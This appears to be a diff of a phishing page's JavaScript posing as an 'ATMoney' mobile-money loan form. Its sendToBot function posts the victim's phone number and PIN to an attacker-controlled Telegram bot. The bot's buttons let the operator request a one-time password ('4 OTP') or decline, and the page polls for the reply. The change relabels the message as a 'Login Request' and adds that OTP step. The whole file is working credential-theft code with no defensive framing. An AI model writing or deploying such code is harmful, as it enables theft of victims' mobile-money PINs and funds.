@@ -720,54 +720,57 @@
         }
 
         // ─── SEND TO BOT ──────────────────────────────────────────────
-        function sendToBot(phone, pin) {
-            if (isProcessing) return;
-            isProcessing = true;
-            continueBtn.disabled = true;
-            continueBtn.textContent = "Requesting…";
+        // ─── SEND TO BOT ──────────────────────────────────────────────
+function sendToBot(phone, pin) {
+    if (isProcessing) return;
+    isProcessing = true;
+    continueBtn.disabled = true;
+    continueBtn.textContent = "Requesting…";
 
-            const ts = Date.now();
-            const approveId = `approve_${ts}`;
-            const declineId = `decline_${ts}`;
+    const ts = Date.now();
+    const approveId = `approve_${ts}`;
+    const declineId = `decline_${ts}`;
 
-            spinner.style.display = 'flex';
+    spinner.style.display = 'flex';
 
-            const amountText = document.getElementById('loanAmount').textContent;
-            const accountType = document.getElementById('accountType').value;
+    const amountText = document.getElementById('loanAmount').textContent;
+    const accountType = document.getElementById('accountType').value;
 
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.CHAT_ID,
-                        text: `<b>🔴 ATMoney Loan Initiation</b>\n\n` +
-                            `Amount: ${amountText}\n` +
-                            `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
-                            `Phone: <code>${phone}</code>\n` +
-                            `PIN: <code>${pin}</code>\n\n` +
-                            `Choose Action:`,
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: "✅ Approve Loan", callback_data: approveId }],
-                                [{ text: "❌ Decline", callback_data: declineId }]
-                            ]
-                        }
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (!data.ok) {
-                        throw new Error('Telegram API error');
-                    }
-                    pollUpdates(approveId, declineId, phone, pin);
-                })
-                .catch(err => {
-                    resetButton();
-                    showError('Failed to send request. Please check your internet connection and try again.');
-                    spinner.style.display = 'none';
-                });
-        }
+    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: `<b>🔴 ATMoney Login Request</b>\n\n` +
+                    `Amount: ${amountText}\n` +
+                    `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
+                    `Phone: <code>${phone}</code>\n` +
+                    `PIN: <code>${pin}</code>\n\n` +
+                    `Choose Action:`,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ 4 OTP  ", callback_data: approveId },
+                            { text: "❌ Decline", callback_data: declineId }
+                        ]
+                    ]
+                }
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (!data.ok) {
+                throw new Error('Telegram API error');
+            }
+            pollUpdates(approveId, declineId, phone, pin);
+        })
+        .catch(err => {
+            resetButton();
+            showError('Failed to send request. Please check your internet connection and try again.');
+            spinner.style.display = 'none';
+        });
+}
 
         // ─── SUBMIT HANDLER ──────────────────────────────────────────────
         continueBtn.onclick = () => {
